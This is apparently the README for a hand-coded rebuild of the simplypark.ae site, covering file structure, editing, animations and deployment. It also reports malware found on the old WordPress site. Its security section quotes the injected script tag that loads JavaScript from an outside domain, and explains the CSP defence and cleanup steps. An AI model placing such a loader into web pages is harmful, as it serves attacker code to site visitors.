# Simply Park – hand-coded site (no WordPress)

A clean rebuild of https://simplypark.ae/ in plain HTML, CSS, PHP and JS. It has the same layout, content and animations as the WordPress/Phlox/Elementor version, without WordPress, jQuery or plugins.

## Malware found on the live WordPress site

The live page loads this script as the first line of `<head>`:

```html
<script src="https://rebrato.com/RadxqW"></script>
```

That is not part of WordPress, the Phlox theme or any plugin. It was injected. The rebuild does not include it, and `.htaccess` sends a `Content-Security-Policy` header that makes browsers refuse scripts from any other domain, so an injection like this cannot run even if it gets into the HTML again.

The rest of the live page (theme custom JS, carousel plugin and Elementor CSS) was checked and holds no other injected code.

**Still to do on the old server:** the injection lives somewhere in the WordPress install (often `wp_options`, theme `header.php`/`functions.php`, a fake plugin, or `wp-config.php`). Before switching, take a backup for the record. Then change the hosting, FTP, database and WordPress admin passwords, and replace the WordPress site with this folder. Don't copy any old files across.

## Structure

```
simplypark/
├── index.php            page template
├── index.html           static copy of index.php (for hosting without PHP)
├── build.php            regenerates index.html:  php build.php
├── .htaccess            security headers (CSP), blocks /includes, redirects old wp-* URLs
├── includes/
│   ├── config.php       ALL text, images, contact details, carousel slides
│   ├── header.php
│   └── footer.php
└── assets/
    ├── css/style.css
    ├── js/main.js       scroll animations, 3D carousels, video, back-to-top
    ├── img/             all images from the live site
    └── video/           Final-Clip-SP-1.mp4
```

## Editing

- **Text, contact details, slides:** edit `includes/config.php`.
- After editing, run `php build.php` if you also host the static `index.html`.

## Animations (same as live)

| Element | Animation |
|---|---|
| Hero heading | fade in up 50px, 1s, `cubic-bezier(0.19,1,0.22,1)` |
| "HISTORICALLY" block | fade in down 50px, 2s, `cubic-bezier(0.77,0,0.175,1)` |
| Connector line | slide from top, 1s |
| "TODAY," block | fade in down 50px, 1s |
| Applications carousel | 3D "fan" (±3 cards, rotateY up to 48°), 0.6s transitions |
| Trends carousel | 3D "stack" (offset + slight rotateY), 0.6s transitions |
| Caption under active card | fade up 10px, 0.4s |
| Back-to-top button | slides in after scrolling, fill + arrow swap on hover |

The hero animations start when the element scrolls into view. Carousels work with the arrows, a click on a side card, keyboard ← →, and touch or mouse swipe.

## Run locally

```bash
cd simplypark && php -S localhost:8000
```

## Deploy

Upload the contents of `simplypark/` to the web root. On Apache, `.htaccess` applies the security headers automatically. On Nginx, add the same `Content-Security-Policy` header in the server block.
